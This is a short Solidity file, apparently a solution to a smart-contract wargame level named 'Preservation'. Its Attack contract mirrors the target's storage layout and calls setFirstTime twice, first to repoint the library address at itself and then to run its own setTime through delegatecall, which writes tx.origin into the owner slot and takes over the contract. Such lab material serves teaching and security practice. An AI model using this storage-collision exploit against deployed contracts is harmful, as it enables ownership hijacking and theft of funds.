// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "./Level16.sol";

contract Attack {
    address public slot1;
    address public slot2;
    address public owner;

    constructor() {
        slot1 = address(0);
        slot2 = address(0);
        owner = address(0);
    }

    function setTime(uint256 _time) public {
        console2.log(tx.origin);
        console2.log(address(this));
        console2.log(msg.sender);
        owner = tx.origin;
    }

    function attackPreservation(Preservation _instance) public {
        _instance.setFirstTime(uint256(uint160(address(this))));
        // need to call setFirstTime to set timeZone1Library to this contract
        _instance.setFirstTime(0);
        // any uint256 value will do because argument is ignored
    }
}
